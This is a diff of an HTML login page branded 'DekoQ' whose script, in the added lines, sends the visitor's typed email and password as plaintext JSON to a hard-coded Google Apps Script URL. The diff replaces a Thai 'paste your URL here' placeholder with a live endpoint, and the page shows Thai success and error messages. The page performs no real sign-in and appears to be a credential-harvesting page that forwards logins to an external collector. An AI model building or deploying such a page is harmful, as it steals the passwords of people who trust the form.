@@ -12,21 +12,22 @@
       font-family: 'Arial', sans-serif;
       height: 100vh;
       display: flex;
-      flex-direction: column;
       justify-content: center;
       align-items: center;
-      color: white;
+      flex-direction: column;
+      text-align: center;
     }
 
     .brand-title {
+      color: white;
       font-size: 3rem;
       font-weight: bold;
-      margin: 0;
+      margin-bottom: 0.5rem;
     }
 
     .subtitle {
       font-size: 1.2rem;
-      margin-top: 0.5rem;
+      color: white;
       margin-bottom: 2rem;
     }
 
@@ -34,63 +35,52 @@
       background: white;
       padding: 2rem;
       border-radius: 12px;
-      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+      box-shadow: 0 10px 20px rgba(0,0,0,0.2);
       width: 90%;
       max-width: 400px;
-      color: black;
     }
 
-    .form-box label {
+    input {
       display: block;
-      margin-bottom: 0.5rem;
-      font-weight: bold;
-    }
-
-    .form-box input {
       width: 100%;
-      padding: 0.75rem;
-      margin-bottom: 1.2rem;
-      border: 1px solid #ccc;
-      border-radius: 8px;
+      margin-bottom: 1rem;
+      padding: 0.8rem;
       font-size: 1rem;
+      border: 1px solid #ccc;
+      border-radius: 6px;
     }
 
-    .form-box button {
-      width: 100%;
-      padding: 0.75rem;
+    button {
       background: #222;
       color: white;
+      padding: 0.8rem;
+      width: 100%;
       border: none;
-      border-radius: 8px;
       font-size: 1rem;
+      border-radius: 6px;
       cursor: pointer;
       transition: background 0.3s ease;
     }
 
-    .form-box button:hover {
+    button:hover {
       background: #000;
     }
 
     #status {
       margin-top: 1rem;
       font-size: 0.9rem;
-      color: green;
-      text-align: center;
+      color: #28a745;
     }
   </style>
 </head>
 <body>
-  <h1 class="brand-title">DekoQ</h1>
+  <div class="brand-title">DekoQ</div>
   <p class="subtitle">Welcome!</p>
 
   <div class="form-box">
     <form>
-      <label for="email">Username/Email</label>
-      <input type="email" id="email" name="email" placeholder="Value" required />
-
-      <label for="password">Password</label>
-      <input type="password" id="password" name="password" placeholder="Value" required />
-
+      <input type="email" id="email" placeholder="Username/Email" required />
+      <input type="password" id="password" placeholder="Password" required />
       <button type="submit">Submit</button>
     </form>
     <p id="status"></p>
@@ -98,28 +88,27 @@
 
   <script>
     const form = document.querySelector("form");
-    const scriptURL = "https://script.google.com/macros/s/วาง-URL-ของคุณที่นี่/exec"; // <<== ใส่ลิงก์ Apps Script ของคุณ
-    const status = document.getElementById("status");
+    const scriptURL = "https://script.google.com/macros/s/AKfycby6SuSSgdHzk765vOObTNLXYNN0stvUi5qFtxFjhCqC_booYDtzbYTDm2sSVE21h9D03Q/exec";
 
-    form.addEventListener("submit", (e) => {
+    form.addEventListener("submit", e => {
       e.preventDefault();
-      const email = form.email.value;
-      const password = form.password.value;
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
 
       fetch(scriptURL, {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ email, password }),
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ email, password })
       })
-        .then((res) => res.text())
-        .then((res) => {
-          status.textContent = "ส่งข้อมูลสำเร็จแล้ว!";
-          form.reset();
-        })
-        .catch((err) => {
-          status.textContent = "เกิดข้อผิดพลาด!";
-          console.error(err);
-        });
+      .then(res => {
+        document.getElementById("status").textContent = "ส่งข้อมูลสำเร็จแล้ว!";
+        form.reset();
+      })
+      .catch(err => {
+        document.getElementById("status").textContent = "เกิดข้อผิดพลาด กรุณาลองใหม่.";
+      });
     });
   </script>
 </body>
